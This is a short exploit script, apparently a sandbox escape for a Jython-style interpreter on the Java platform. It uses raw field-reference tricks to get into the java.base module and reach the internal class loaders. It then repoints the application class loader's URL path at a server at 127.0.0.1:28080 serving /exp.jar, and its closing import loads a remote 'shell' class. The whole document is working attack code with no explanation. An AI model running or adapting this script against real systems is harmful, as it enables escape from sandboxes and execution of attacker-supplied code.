import java
import jdk
import javax.crypto.JceSecurity

HOST = '127.0.0.1'
PORT = 28080
AUTHORITY = '127.0.0.1:28080'
PATH = '/exp.jar'

fld = &'pwn'.value
FieldRef = fld.__class__

# Set jython.rts.ObjectTraitImpl$FieldRef@5025a98f to be in java.base module
Class = java.lang.Class
f_module = Class.module
fld.self = Class
fld.member = f_module
m_java_base = *fld

fld.self = FieldRef
fld.member = f_module
*fld = m_java_base

# Load builtin classloaders
ClassLoaders = jdk.internal.loader.ClassLoaders
BuiltinClassLoader = jdk.internal.loader.BuiltinClassLoader

fld.self = None
fld.member = ClassLoaders.BOOT_LOADER
BOOT = *fld
fld.member = ClassLoaders.PLATFORM_LOADER
PLAT = *fld
fld.member = ClassLoaders.APP_LOADER
APP = *fld

# Get APP.ucp
f_ucp = BuiltinClassLoader.ucp
fld.self = APP
fld.member = f_ucp
ucp = *fld

fld.self = None
fld.member = javax.crypto.JceSecurity.NULL_URL
url = *fld

# Set unopenedUrls to our url
ucp.unopenedUrls.head = 0
ucp.unopenedUrls.tail = 1
ucp.unopenedUrls.elements[0] = url

# Canabolize the existing url to point to our server
url.host = HOST
url.authority = AUTHORITY
url.port = PORT
url.file = PATH
url.path = PATH

# Fire away!
import exp.shell
